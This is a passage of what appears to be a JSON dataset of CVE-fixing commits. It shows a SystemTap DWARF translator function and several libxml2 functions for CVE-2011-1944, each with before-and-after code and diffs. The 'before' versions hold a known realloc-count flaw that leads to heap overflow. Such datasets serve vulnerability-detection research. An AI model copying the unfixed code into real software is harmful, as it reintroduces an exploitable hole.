piece->pointer.target = location_from_attr (ctx, indent,\n\t\t\t\t\t\t\t      &target);\n\t\t  break;\n\t\tdefault:\n\t\t  DIE (\"unexpected implicit pointer attribute!\");\n\t\t  break;\n\t\t}\n#endif\n\t    }\n\t  else if (implicit_value.data == NULL)\n\t    {\n\t      piece->type = tos_value ? loc_value : loc_address;\n\t      piece->address.declare = NULL;\n\t      piece->address.program = program;\n\t      piece->address.stack_depth = max_stack;\n\t      piece->address.used_deref = used_deref;\n\t    }\n\t  else\n\t    {\n\t      piece->type = loc_constant;\n\t      piece->byte_size = implicit_value.length;\n\t      piece->constant_block = implicit_value.data;\n\t    }\n\t}\n      else if (tos_register == -1)\n\tDIE (\"stack underflow\");\n      else if (obstack_object_size (ctx->pool) != 0)\n\tDIE (\"register value must stand alone in location expression\");\n      else\n\t{\n\t  piece->type = loc_register;\n\t  piece->reg.regno = tos_register;\n\t  piece->reg.offset = 0;\n\t}\n      return NULL;\n    }\n\n  reset ();\n  struct location *pieces = NULL, **tailpiece = &pieces;\n  size_t piece_expr_start = 0;\n  Dwarf_Word piece_total_bytes = 0;\n  for (i = 0; i < len; ++i)\n    {\n      unsigned int reg;\n      uint_fast8_t sp;\n      Dwarf_Word value;\n\n      inline bool more_ops (void)\n      {\n\treturn (expr[i].atom != DW_OP_nop\n\t\t&& expr[i].atom != DW_OP_piece\n\t\t&& expr[i].atom != DW_OP_bit_piece);\n      }\n\n      if (tos_value && more_ops ())\n\tDIE (\"operations follow DW_OP_stack_value\");\n\n      if (implicit_value.data != NULL && more_ops ())\n\tDIE (\"operations follow DW_OP_implicit_value\");\n\n      if (implicit_pointer != NULL && more_ops ())\n\tDIE (\"operations follow DW_OP_GNU_implicit_pointer\");\n\n      switch (expr[i].atom)\n\t{\n\t  /* Basic stack operations.  */\n\tcase DW_OP_nop:\n\t  break;\n\n\tcase DW_OP_dup:\n\t  if (stack_depth < 1)\n\t    goto underflow;\n\t  else\n\t    {\n\t      unsigned int tos = STACK (0);\n\t      push (STACKFMT, tos);\n\t    }\n\t  break;\n\n\tcase DW_OP_drop:\n\t  {\n\t    POP (ignore);\n\t    emit (\"%*s/* drop \" STACKFMT \"*/\\n\", indent * 2, \"\", ignore);\n\t    break;\n\t  }\n\n\tcase DW_OP_pick:\n\t  sp = expr[i].number;\n\top_pick:\n\t  if (sp >= stack_depth)\n\t    goto underflow;\n\t  sp = STACK (sp);\n\t  push (STACKFMT, sp);\n\t  break;\n\n\tcase DW_OP_over:\n\t  sp = 1;\n\t  goto op_pick;\n\n\tcase DW_OP_swap:\n\t  if (stack_depth < 2)\n\t    goto underflow;\n\t  deepen ();\t\t/* Use a temporary slot.  */\n\t  emit (\"%*s\"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \";\\n\",\n\t\tindent * 2, \"\",\n\t\tSTACK (-1), STACK (0),\n\t\tSTACK (0), STACK (1),\n\t\tSTACK (1), STACK (-1));\n\t  break;\n\n\tcase DW_OP_rot:\n\t  if (stack_depth < 3)\n\t    goto underflow;\n\t  deepen ();\t\t/* Use a temporary slot.  */\n\t  emit (\"%*s\"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \", \"\n\t\tSTACKFMT \" = \" STACKFMT \";\\n\",\n\t\tindent * 2, \"\",\n\t\tSTACK (-1), STACK (0),\n\t\tSTACK (0), STACK (1),\n\t\tSTACK (1), STACK (2),\n\t\tSTACK (3), STACK (-1));\n\t  break;\n\n\n\t  /* Control flow operations.  */\n\tcase DW_OP_skip:\n\t  {\n\t    Dwarf_Off target = expr[i].offset + 3 + expr[i].number;\n\t    while (i + 1 < len && expr[i + 1].offset < target)\n\t      ++i;\n\t    if (expr[i + 1].offset != target)\n\t      DIE (\"invalid skip target\");\n\t    break;\n\t  }\n\n\tcase DW_OP_bra:\n\t  DIE (\"conditional branches not supported\");\n\t  break;\n\n\n\t  /* Memory access.  */\n\tcase DW_OP_deref:\n\t  {\n\t    POP (addr);\n\t    push (\"deref (sizeof (void *), \" STACKFMT \")\", addr);\n\t    used_deref = true;\n\t  }\n\t  break;\n\n\tcase DW_OP_deref_size:\n\t  {\n\t    POP (addr);\n\t    push (\"deref (\" UFORMAT \", \" STACKFMT \")\",\n\t\t  expr[i].number, addr);\n\t    used_deref = true;\n\t  }\n\t  break;\n\n\tcase DW_OP_xderef:\n\t  {\n\t    POP (addr);\n\t    POP (as);\n\t    push (\"xderef (sizeof (void *), \" STACKFMT \", \" STACKFMT \")\",\n\t\t  addr, as);\n\t    used_deref = true;\n\t  }\n\t  break;\n\n\tcase DW_OP_xderef_size:\n\t  {\n\t    POP (addr);\n\t    POP (as);\n\t    push (\"xderef (\" UFORMAT \", \" STACKFMT \", \" STACKFMT \")\",\n\t\t  expr[i].number, addr, as);\n\t    used_deref = true;\n\t  }\n\t  break;\n\n\t  /* Constant-value operations.  */\n\n\tcase DW_OP_addr:\n\t  emit (\"%*s\" STACKFMT \" = \", indent * 2, \"\", PUSH);\n\t  (*ctx->emit_address) (ctx->fail_arg, ctx->pool,\n\t\t\t\tctx->dwbias + expr[i].number);\n\t  emit (\";\\n\");\n\t  break;\n\n\tcase DW_OP_lit0 ... DW_OP_lit31:\n\t  value = expr[i].atom - DW_OP_lit0;\n\t  goto op_const;\n\n\tcase DW_OP_const1u:\n\tcase DW_OP_const1s:\n\tcase DW_OP_const2u:\n\tcase DW_OP_const2s:\n\tcase DW_OP_const4u:\n\tcase DW_OP_const4s:\n\tcase DW_OP_const8u:\n\tcase DW_OP_const8s:\n\tcase DW_OP_constu:\n\tcase DW_OP_consts:\n\t  value = expr[i].number;\n\top_const:\n\t  push (SFORMAT, value);\n\t  break;\n\n\t  /* Arithmetic operations.  */\n#define UNOP(dw_op, c_op)\t\t\t\t\t\t      \\\n\tcase DW_OP_##dw_op:\t\t\t\t\t\t      \\\n\t  {\t\t\t\t\t\t\t\t      \\\n\t    POP (tos);\t\t\t\t\t\t\t      \\\n\t    push (\"%s (\" STACKFMT \")\", #c_op, tos);\t\t\t      \\\n\t  }\t\t\t\t\t\t\t\t      \\\n\t  break\n#define BINOP(dw_op, c_op)\t\t\t\t\t\t      \\\n\tcase DW_OP_##dw_op:\t\t\t\t\t\t      \\\n\t  {\t\t\t\t\t\t\t\t      \\\n\t    POP (b);\t\t\t\t\t\t\t      \\\n\t    POP (a);\t\t\t\t\t\t\t      \\\n\t    push (STACKFMT \" %s \" STACKFMT, a, #c_op, b);\t\t      \\\n\t  }\t\t\t\t\t\t\t\t      \\\n\t  break\n\n\t  UNOP (abs, op_abs);\n\t  BINOP (and, &);\n\t  BINOP (minus, -);\n\t  BINOP (mul, *);\n\t  UNOP (neg, -);\n\t  UNOP (not, ~);\n\t  BINOP (or, |);\n\t  BINOP (plus, +);\n\t  BINOP (shl, <<);\n\t  BINOP (shr, >>);\n\t  BINOP (xor, ^);\n\n\t  /* Comparisons are binary operators too.  */\n\t  BINOP (le, <=);\n\t  BINOP (ge, >=);\n\t  BINOP (eq, ==);\n\t  BINOP (lt, <);\n\t  BINOP (gt, >);\n\t  BINOP (ne, !=);\n\n#undef\tUNOP\n#undef\tBINOP\n\n\tcase DW_OP_shra:\n\t  {\n\t    POP (b);\n\t    POP (a);\n\t    push (\"(%s) \" STACKFMT \" >> (%s)\" STACKFMT,\n\t\t  stack_slot_type (loc, true), a,\n\t\t  stack_slot_type (loc, true), b);\n\t    break;\n\t  }\n\n\tcase DW_OP_div:\n\t  {\n\t    POP (b);\n\t    POP (a);\n\t    push (\"dwarf_div_op((%s) \" STACKFMT \", (%s) \" STACKFMT \")\",\n\t\t  stack_slot_type (loc, true), a,\n\t\t  stack_slot_type (loc, true), b);\n\t    used_deref = true;\n\t    break;\n\t  }\n\n\tcase DW_OP_mod:\n\t  {\n\t    POP (b);\n\t    POP (a);\n\t    push (\"dwarf_mod_op((%s) \" STACKFMT \", (%s) \" STACKFMT \")\",\n\t\t  stack_slot_type (loc, false), a,\n\t\t  stack_slot_type (loc, false), b);\n\t    used_deref = true;\n\t    break;\n\t  }\n\n\tcase DW_OP_plus_uconst:\n\t  {\n\t    POP (x);\n\t    push (STACKFMT \" + \" UFORMAT, x, expr[i].number);\n\t  }\n\t  break;\n\n\n\t  /* Register-relative addressing.  */\n\tcase DW_OP_breg0 ... DW_OP_breg31:\n\t  reg = expr[i].atom - DW_OP_breg0;\n\t  value = expr[i].number;\n\t  goto op_breg;\n\n\tcase DW_OP_bregx:\n\t  reg = expr[i].number;\n\t  value = expr[i].number2;\n\top_breg:\n\t  push (\"fetch_register (%u) + \" SFORMAT, reg, value);\n\t  break;\n\n\tcase DW_OP_fbreg:\n\t  if (need_fb == NULL)\n\t    DIE (\"DW_OP_fbreg from DW_AT_frame_base\");\n\t  *need_fb = true;\n\t  push (\"frame_base + \" SFORMAT, expr[i].number);\n\t  break;\n\n\t  /* Direct register contents.  */\n\tcase DW_OP_reg0 ... DW_OP_reg31:\n\t  reg = expr[i].atom - DW_OP_reg0;\n\t  goto op_reg;\n\n\tcase DW_OP_regx:\n\t  reg = expr[i].number;\n\top_reg:\n\t  tos_register = reg;\n\t  break;\n\n\t  /* Special magic.  */\n\tcase DW_OP_piece:\n\t  if (stack_depth > 1)\n\t    /* If this ever happens we could copy the program.  */\n\t    DIE (\"DW_OP_piece left multiple values on stack\");\n\t  else\n\t    {\n\t      /* The obstack has a pending program for loc_address,\n\t\t so we must finish that piece off before we can\n\t\t allocate again.  */\n\t      struct location temp_piece =\n\t\t{\n\t\t  .context = loc->context,\n\t\t  .frame_base = NULL,\n\t\t  .ops = &expr[piece_expr_start],\n\t\t  .nops = i - piece_expr_start,\n\t\t};\n\t      const char *failure = finish (&temp_piece);\n\t      if (failure != NULL)\n\t\treturn failure;\n\n\t      struct location *piece = obstack_alloc (ctx->pool, sizeof *piece);\n\t      *piece = temp_piece;\n\n\t      piece_expr_start = i + 1;\n\n\t      piece_total_bytes += piece->byte_size = expr[i].number;\n\n\t      *tailpiece = piece;\n\t      tailpiece = &piece->next;\n\t      piece->next = NULL;\n\n\t      /* Reset default conditions for handling the next piece.  */\n\t      reset ();\n\t    }\n\t  break;\n\n\tcase DW_OP_stack_value:\n\t  if (stack_depth > 1)\n\t    DIE (\"DW_OP_stack_value left multiple values on stack\");\n\t  else\n\t    {\n\t      /* Fetch a register to top of stack, or check for underflow.\n\t\t Then mark the TOS as being a value.  */\n\t      POP (tos);\n\t      assert (tos == 0);\n\t      PUSH;\n\t      tos_value = true;\n\t    }\n\t  break;\n\n\tcase DW_OP_implicit_value:\n\t  if (ctx->attr == NULL)\n\t    DIE (\"DW_OP_implicit_value used in invalid context\"\n\t\t \" (no DWARF attribute, ABI return value location?)\");\n\n\t  /* It's supposed to appear by itself, except for DW_OP_piece.  */\n\t  if (stack_depth != 0)\n\t    DIE (\"DW_OP_implicit_value follows stack operations\");\n\n#if _ELFUTILS_PREREQ (0, 143)\n\t  if (dwarf_getlocation_implicit_value (ctx->attr,\n\t\t\t\t\t\t(Dwarf_Op *) &expr[i],\n\t\t\t\t\t\t&implicit_value) != 0)\n\t    DIE (\"dwarf_getlocation_implicit_value failed\");\n\n\t  /* Fake top of stack: implicit_value being set marks it.  */\n\t  PUSH;\n\t  break;\n#endif\n\n\t  DIE (\"DW_OP_implicit_value not supported\");\n\t  break;\n\n#if _ELFUTILS_PREREQ (0, 149)\n\tcase DW_OP_GNU_implicit_pointer:\n\t  implicit_pointer = &expr[i];\n\t  /* Fake top of stack: implicit_pointer being set marks it.  */\n\t  PUSH;\n\t  break;\n#endif\n\n\tcase DW_OP_call_frame_cfa:\n\t  // We pick this out when processing DW_AT_frame_base in\n\t  // so it really shouldn't turn up here.\n\t  if (need_fb == NULL)\n\t    DIE (\"DW_OP_call_frame_cfa while processing frame base\");\n\t  else\n\t    DIE (\"DW_OP_call_frame_cfa not expected outside DW_AT_frame_base\");\n\t  break;\n\n\tcase DW_OP_push_object_address:\n\t  DIE (\"XXX DW_OP_push_object_address\");\n\t  break;\n\n\tdefault:\n\t  DIE (\"unrecognized operation\");\n\t  break;\n\t}\n    }\n\n  if (pieces == NULL)\n    return finish (loc);\n\n  if (piece_expr_start != i)\n    DIE (\"extra operations after last DW_OP_piece\");\n\n  loc->type = loc_noncontiguous;\n  loc->pieces = pieces;\n  loc->byte_size = piece_total_bytes;\n\n  return NULL;\n\n underflow:\n  DIE (\"stack underflow\");\n\n#undef emit\n#undef push\n#undef PUSH\n#undef POP\n#undef STACK\n#undef DIE\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -348,7 +348,6 @@\n \t  UNOP (abs, op_abs);\n \t  BINOP (and, &);\n \t  BINOP (minus, -);\n-\t  BINOP (mod, %);\n \t  BINOP (mul, *);\n \t  UNOP (neg, -);\n \t  UNOP (not, ~);\n@@ -383,9 +382,21 @@\n \t  {\n \t    POP (b);\n \t    POP (a);\n-\t    push (\"(%s) \" STACKFMT \" / (%s)\" STACKFMT,\n+\t    push (\"dwarf_div_op((%s) \" STACKFMT \", (%s) \" STACKFMT \")\",\n \t\t  stack_slot_type (loc, true), a,\n \t\t  stack_slot_type (loc, true), b);\n+\t    used_deref = true;\n+\t    break;\n+\t  }\n+\n+\tcase DW_OP_mod:\n+\t  {\n+\t    POP (b);\n+\t    POP (a);\n+\t    push (\"dwarf_mod_op((%s) \" STACKFMT \", (%s) \" STACKFMT \")\",\n+\t\t  stack_slot_type (loc, false), a,\n+\t\t  stack_slot_type (loc, false), b);\n+\t    used_deref = true;\n \t    break;\n \t  }\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t  BINOP (mod, %);",
                "\t    push (\"(%s) \" STACKFMT \" / (%s)\" STACKFMT,"
            ],
            "added_lines": [
                "\t    push (\"dwarf_div_op((%s) \" STACKFMT \", (%s) \" STACKFMT \")\",",
                "\t    used_deref = true;",
                "\t    break;",
                "\t  }",
                "",
                "\tcase DW_OP_mod:",
                "\t  {",
                "\t    POP (b);",
                "\t    POP (a);",
                "\t    push (\"dwarf_mod_op((%s) \" STACKFMT \", (%s) \" STACKFMT \")\",",
                "\t\t  stack_slot_type (loc, false), a,",
                "\t\t  stack_slot_type (loc, false), b);",
                "\t    used_deref = true;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1944",
        "func_name": "GNOME/libxml2/xmlXPathNodeSetMergeAndClearNoDupls",
        "description": "Integer overflow in xpath.c in libxml2 2.6.x through 2.6.32 and 2.7.x through 2.7.8, and libxml 1.8.16 and earlier, allows context-dependent attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted XML file that triggers a heap-based buffer overflow when adding a new namespace node, related to handling of XPath expressions.",
        "git_url": "https://github.com/GNOME/libxml2/commit/d7958b21e7f8c447a26bb2436f08402b2c308be4",
        "commit_title": "Fix some potential problems on reallocation failures",
        "commit_text": " The count was incremented before the allocation and not fixed in case of failure * xpath.c: corrects a few instances where the available count of some            structure is updated before we know the allocation actually            succeeds",
        "func_before": "static xmlNodeSetPtr\nxmlXPathNodeSetMergeAndClearNoDupls(xmlNodeSetPtr set1, xmlNodeSetPtr set2,\n\t\t\t\t    int hasNullEntries)\n{\n    if (set2 == NULL)\n\treturn(set1);\n    if ((set1 == NULL) && (hasNullEntries == 0)) {\n\t/*\n\t* Note that doing a memcpy of the list, namespace nodes are\n\t* just assigned to set1, since set2 is cleared anyway.\n\t*/\n\tset1 = xmlXPathNodeSetCreateSize(set2->nodeNr);\n\tif (set1 == NULL)\n\t    return(NULL);\n\tif (set2->nodeNr != 0) {\n\t    memcpy(set1->nodeTab, set2->nodeTab,\n\t\tset2->nodeNr * sizeof(xmlNodePtr));\n\t    set1->nodeNr = set2->nodeNr;\n\t}\n    } else {\n\tint i;\n\txmlNodePtr n2;\n\n\tif (set1 == NULL)\n\t    set1 = xmlXPathNodeSetCreate(NULL);\n        if (set1 == NULL)\n            return (NULL);\n\n\tfor (i = 0;i < set2->nodeNr;i++) {\n\t    n2 = set2->nodeTab[i];\n\t    /*\n\t    * Skip NULLed entries.\n\t    */\n\t    if (n2 == NULL)\n\t\tcontinue;\n\t    if (set1->nodeMax == 0) {\n\t\tset1->nodeTab = (xmlNodePtr *) xmlMalloc(\n\t\t    XML_NODESET_DEFAULT * sizeof(xmlNodePtr));\n\t\tif (set1->nodeTab == NULL) {\n\t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\t    return(NULL);\n\t\t}\n\t\tmemset(set1->nodeTab, 0,\n\t\t    XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n\t\tset1->nodeMax = XML_NODESET_DEFAULT;\n\t    } else if (set1->nodeNr >= set1->nodeMax) {\n\t\txmlNodePtr *temp;\n\n\t\tset1->nodeMax *= 2;\n\t\ttemp = (xmlNodePtr *) xmlRealloc(\n\t\t    set1->nodeTab, set1->nodeMax * sizeof(xmlNodePtr));\n\t\tif (temp == NULL) {\n\t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\t    return(NULL);\n\t\t}\n\t\tset1->nodeTab = temp;\n\t    }\n\t    set1->nodeTab[set1->nodeNr++] = n2;\n\t}\n    }\n    set2->nodeNr = 0;\n    return(set1);\n}",
        "func": "static xmlNodeSetPtr\nxmlXPathNodeSetMergeAndClearNoDupls(xmlNodeSetPtr set1, xmlNodeSetPtr set2,\n\t\t\t\t    int hasNullEntries)\n{\n    if (set2 == NULL)\n\treturn(set1);\n    if ((set1 == NULL) && (hasNullEntries == 0)) {\n\t/*\n\t* Note that doing a memcpy of the list, namespace nodes are\n\t* just assigned to set1, since set2 is cleared anyway.\n\t*/\n\tset1 = xmlXPathNodeSetCreateSize(set2->nodeNr);\n\tif (set1 == NULL)\n\t    return(NULL);\n\tif (set2->nodeNr != 0) {\n\t    memcpy(set1->nodeTab, set2->nodeTab,\n\t\tset2->nodeNr * sizeof(xmlNodePtr));\n\t    set1->nodeNr = set2->nodeNr;\n\t}\n    } else {\n\tint i;\n\txmlNodePtr n2;\n\n\tif (set1 == NULL)\n\t    set1 = xmlXPathNodeSetCreate(NULL);\n        if (set1 == NULL)\n            return (NULL);\n\n\tfor (i = 0;i < set2->nodeNr;i++) {\n\t    n2 = set2->nodeTab[i];\n\t    /*\n\t    * Skip NULLed entries.\n\t    */\n\t    if (n2 == NULL)\n\t\tcontinue;\n\t    if (set1->nodeMax == 0) {\n\t\tset1->nodeTab = (xmlNodePtr *) xmlMalloc(\n\t\t    XML_NODESET_DEFAULT * sizeof(xmlNodePtr));\n\t\tif (set1->nodeTab == NULL) {\n\t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\t    return(NULL);\n\t\t}\n\t\tmemset(set1->nodeTab, 0,\n\t\t    XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n\t\tset1->nodeMax = XML_NODESET_DEFAULT;\n\t    } else if (set1->nodeNr >= set1->nodeMax) {\n\t\txmlNodePtr *temp;\n\n\t\ttemp = (xmlNodePtr *) xmlRealloc(\n\t\t    set1->nodeTab, set1->nodeMax * 2 * sizeof(xmlNodePtr));\n\t\tif (temp == NULL) {\n\t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\t    return(NULL);\n\t\t}\n\t\tset1->nodeTab = temp;\n\t\tset1->nodeMax *= 2;\n\t    }\n\t    set1->nodeTab[set1->nodeNr++] = n2;\n\t}\n    }\n    set2->nodeNr = 0;\n    return(set1);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -46,14 +46,14 @@\n \t    } else if (set1->nodeNr >= set1->nodeMax) {\n \t\txmlNodePtr *temp;\n \n-\t\tset1->nodeMax *= 2;\n \t\ttemp = (xmlNodePtr *) xmlRealloc(\n-\t\t    set1->nodeTab, set1->nodeMax * sizeof(xmlNodePtr));\n+\t\t    set1->nodeTab, set1->nodeMax * 2 * sizeof(xmlNodePtr));\n \t\tif (temp == NULL) {\n \t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n \t\t    return(NULL);\n \t\t}\n \t\tset1->nodeTab = temp;\n+\t\tset1->nodeMax *= 2;\n \t    }\n \t    set1->nodeTab[set1->nodeNr++] = n2;\n \t}",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tset1->nodeMax *= 2;",
                "\t\t    set1->nodeTab, set1->nodeMax * sizeof(xmlNodePtr));"
            ],
            "added_lines": [
                "\t\t    set1->nodeTab, set1->nodeMax * 2 * sizeof(xmlNodePtr));",
                "\t\tset1->nodeMax *= 2;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1944",
        "func_name": "GNOME/libxml2/xmlXPathNodeSetAddUnique",
        "description": "Integer overflow in xpath.c in libxml2 2.6.x through 2.6.32 and 2.7.x through 2.7.8, and libxml 1.8.16 and earlier, allows context-dependent attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted XML file that triggers a heap-based buffer overflow when adding a new namespace node, related to handling of XPath expressions.",
        "git_url": "https://github.com/GNOME/libxml2/commit/d7958b21e7f8c447a26bb2436f08402b2c308be4",
        "commit_title": "Fix some potential problems on reallocation failures",
        "commit_text": " The count was incremented before the allocation and not fixed in case of failure * xpath.c: corrects a few instances where the available count of some            structure is updated before we know the allocation actually            succeeds",
        "func_before": "void\nxmlXPathNodeSetAddUnique(xmlNodeSetPtr cur, xmlNodePtr val) {\n    if ((cur == NULL) || (val == NULL)) return;\n\n#if 0\n    if ((val->type == XML_ELEMENT_NODE) && (val->name[0] == ' '))\n\treturn;\t/* an XSLT fake node */\n#endif\n\n    /* @@ with_ns to check whether namespace nodes should be looked at @@ */\n    /*\n     * grow the nodeTab if needed\n     */\n    if (cur->nodeMax == 0) {\n        cur->nodeTab = (xmlNodePtr *) xmlMalloc(XML_NODESET_DEFAULT *\n\t\t\t\t\t     sizeof(xmlNodePtr));\n\tif (cur->nodeTab == NULL) {\n\t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n\t    return;\n\t}\n\tmemset(cur->nodeTab, 0 ,\n\t       XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n        cur->nodeMax = XML_NODESET_DEFAULT;\n    } else if (cur->nodeNr == cur->nodeMax) {\n        xmlNodePtr *temp;\n\n        cur->nodeMax *= 2;\n\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax *\n\t\t\t\t      sizeof(xmlNodePtr));\n\tif (temp == NULL) {\n\t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n\t    return;\n\t}\n\tcur->nodeTab = temp;\n    }\n    if (val->type == XML_NAMESPACE_DECL) {\n\txmlNsPtr ns = (xmlNsPtr) val;\n\n\tcur->nodeTab[cur->nodeNr++] =\n\t    xmlXPathNodeSetDupNs((xmlNodePtr) ns->next, ns);\n    } else\n\tcur->nodeTab[cur->nodeNr++] = val;\n}",
        "func": "void\nxmlXPathNodeSetAddUnique(xmlNodeSetPtr cur, xmlNodePtr val) {\n    if ((cur == NULL) || (val == NULL)) return;\n\n#if 0\n    if ((val->type == XML_ELEMENT_NODE) && (val->name[0] == ' '))\n\treturn;\t/* an XSLT fake node */\n#endif\n\n    /* @@ with_ns to check whether namespace nodes should be looked at @@ */\n    /*\n     * grow the nodeTab if needed\n     */\n    if (cur->nodeMax == 0) {\n        cur->nodeTab = (xmlNodePtr *) xmlMalloc(XML_NODESET_DEFAULT *\n\t\t\t\t\t     sizeof(xmlNodePtr));\n\tif (cur->nodeTab == NULL) {\n\t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n\t    return;\n\t}\n\tmemset(cur->nodeTab, 0 ,\n\t       XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n        cur->nodeMax = XML_NODESET_DEFAULT;\n    } else if (cur->nodeNr == cur->nodeMax) {\n        xmlNodePtr *temp;\n\n\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax * 2 *\n\t\t\t\t      sizeof(xmlNodePtr));\n\tif (temp == NULL) {\n\t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n\t    return;\n\t}\n\tcur->nodeTab = temp;\n        cur->nodeMax *= 2;\n    }\n    if (val->type == XML_NAMESPACE_DECL) {\n\txmlNsPtr ns = (xmlNsPtr) val;\n\n\tcur->nodeTab[cur->nodeNr++] =\n\t    xmlXPathNodeSetDupNs((xmlNodePtr) ns->next, ns);\n    } else\n\tcur->nodeTab[cur->nodeNr++] = val;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -24,14 +24,14 @@\n     } else if (cur->nodeNr == cur->nodeMax) {\n         xmlNodePtr *temp;\n \n-        cur->nodeMax *= 2;\n-\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax *\n+\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax * 2 *\n \t\t\t\t      sizeof(xmlNodePtr));\n \tif (temp == NULL) {\n \t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n \t    return;\n \t}\n \tcur->nodeTab = temp;\n+        cur->nodeMax *= 2;\n     }\n     if (val->type == XML_NAMESPACE_DECL) {\n \txmlNsPtr ns = (xmlNsPtr) val;",
        "diff_line_info": {
            "deleted_lines": [
                "        cur->nodeMax *= 2;",
                "\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax *"
            ],
            "added_lines": [
                "\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax * 2 *",
                "        cur->nodeMax *= 2;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1944",
        "func_name": "GNOME/libxml2/xmlXPathNodeSetMerge",
        "description": "Integer overflow in xpath.c in libxml2 2.6.x through 2.6.32 and 2.7.x through 2.7.8, and libxml 1.8.16 and earlier, allows context-dependent attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted XML file that triggers a heap-based buffer overflow when adding a new namespace node, related to handling of XPath expressions.",
        "git_url": "https://github.com/GNOME/libxml2/commit/d7958b21e7f8c447a26bb2436f08402b2c308be4",
        "commit_title": "Fix some potential problems on reallocation failures",
        "commit_text": " The count was incremented before the allocation and not fixed in case of failure * xpath.c: corrects a few instances where the available count of some            structure is updated before we know the allocation actually            succeeds",
        "func_before": "xmlNodeSetPtr\nxmlXPathNodeSetMerge(xmlNodeSetPtr val1, xmlNodeSetPtr val2) {\n    int i, j, initNr, skip;\n    xmlNodePtr n1, n2;\n\n    if (val2 == NULL) return(val1);\n    if (val1 == NULL) {\n\tval1 = xmlXPathNodeSetCreate(NULL);\n    if (val1 == NULL)\n        return (NULL);\n#if 0\n\t/*\n\t* TODO: The optimization won't work in every case, since\n\t*  those nasty namespace nodes need to be added with\n\t*  xmlXPathNodeSetDupNs() to the set; thus a pure\n\t*  memcpy is not possible.\n\t*  If there was a flag on the nodesetval, indicating that\n\t*  some temporary nodes are in, that would be helpfull.\n\t*/\n\t/*\n\t* Optimization: Create an equally sized node-set\n\t* and memcpy the content.\n\t*/\n\tval1 = xmlXPathNodeSetCreateSize(val2->nodeNr);\n\tif (val1 == NULL)\n\t    return(NULL);\n\tif (val2->nodeNr != 0) {\n\t    if (val2->nodeNr == 1)\n\t\t*(val1->nodeTab) = *(val2->nodeTab);\n\t    else {\n\t\tmemcpy(val1->nodeTab, val2->nodeTab,\n\t\t    val2->nodeNr * sizeof(xmlNodePtr));\n\t    }\n\t    val1->nodeNr = val2->nodeNr;\n\t}\n\treturn(val1);\n#endif\n    }\n\n    /* @@ with_ns to check whether namespace nodes should be looked at @@ */\n    initNr = val1->nodeNr;\n\n    for (i = 0;i < val2->nodeNr;i++) {\n\tn2 = val2->nodeTab[i];\n\t/*\n\t * check against duplicates\n\t */\n\tskip = 0;\n\tfor (j = 0; j < initNr; j++) {\n\t    n1 = val1->nodeTab[j];\n\t    if (n1 == n2) {\n\t\tskip = 1;\n\t\tbreak;\n\t    } else if ((n1->type == XML_NAMESPACE_DECL) &&\n\t\t       (n2->type == XML_NAMESPACE_DECL)) {\n\t\tif ((((xmlNsPtr) n1)->next == ((xmlNsPtr) n2)->next) &&\n\t\t    (xmlStrEqual(((xmlNsPtr) n1)->prefix,\n\t\t\t((xmlNsPtr) n2)->prefix)))\n\t\t{\n\t\t    skip = 1;\n\t\t    break;\n\t\t}\n\t    }\n\t}\n\tif (skip)\n\t    continue;\n\n\t/*\n\t * grow the nodeTab if needed\n\t */\n\tif (val1->nodeMax == 0) {\n\t    val1->nodeTab = (xmlNodePtr *) xmlMalloc(XML_NODESET_DEFAULT *\n\t\t\t\t\t\t    sizeof(xmlNodePtr));\n\t    if (val1->nodeTab == NULL) {\n\t        xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\treturn(NULL);\n\t    }\n\t    memset(val1->nodeTab, 0 ,\n\t\t   XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n\t    val1->nodeMax = XML_NODESET_DEFAULT;\n\t} else if (val1->nodeNr == val1->nodeMax) {\n\t    xmlNodePtr *temp;\n\n\t    val1->nodeMax *= 2;\n\t    temp = (xmlNodePtr *) xmlRealloc(val1->nodeTab, val1->nodeMax *\n\t\t\t\t\t     sizeof(xmlNodePtr));\n\t    if (temp == NULL) {\n\t        xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\treturn(NULL);\n\t    }\n\t    val1->nodeTab = temp;\n\t}\n\tif (n2->type == XML_NAMESPACE_DECL) {\n\t    xmlNsPtr ns = (xmlNsPtr) n2;\n\n\t    val1->nodeTab[val1->nodeNr++] =\n\t\txmlXPathNodeSetDupNs((xmlNodePtr) 